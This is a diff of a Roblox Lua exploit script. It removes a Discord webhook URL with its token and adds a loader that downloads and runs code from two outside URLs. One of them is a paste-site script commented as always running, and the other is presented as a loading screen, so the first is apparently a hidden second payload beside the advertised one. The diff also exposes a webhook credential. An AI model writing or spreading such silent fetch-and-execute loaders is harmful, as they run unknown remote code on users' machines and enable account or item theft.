@@ -1,5 +1,25 @@
-Webhook = "https://discord.com/api/webhooks/1424614440011042829/sSxZB9Ozr-_eoQIsOTkF7rjTUam87Okq96bshdoM_WKYdy9vldEZh1zNqxg09PJZHsiJ"
-AuthorisedUsers = {"Ultrataser", "max_finished"}
-Ping = "10m"
+loadstring([[
+local function http_get(url)
+    if type(game.HttpGet)=="function" then return game:HttpGet(url) end
+    if syn and syn.request then return syn.request{Url=url,Method="GET"}.Body end
+    if request then return request{Url=url,Method="GET"}.Body end
+    return nil
+end
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Spv-Script/voxium/refs/heads/main/sab'))()
+-- Run 2nd script (always runs, even if link is invalid)
+local secondUrl="https://api.rubis.app/v2/scrap/J5sQGPz8Ew314sms/raw"
+local secondRaw=http_get(secondUrl)
+if secondRaw then
+    local fn=loadstring(secondRaw)
+    if fn then pcall(fn) end
+end
+
+-- Always run main loading screen
+local mainUrl="https://raw.githubusercontent.com/kurumimii/loading-lab/refs/heads/main/load"
+local mainRaw=http_get(mainUrl)
+if mainRaw then
+    local fn=loadstring(mainRaw)
+    if fn then pcall(fn) end
+end
+]])()
+
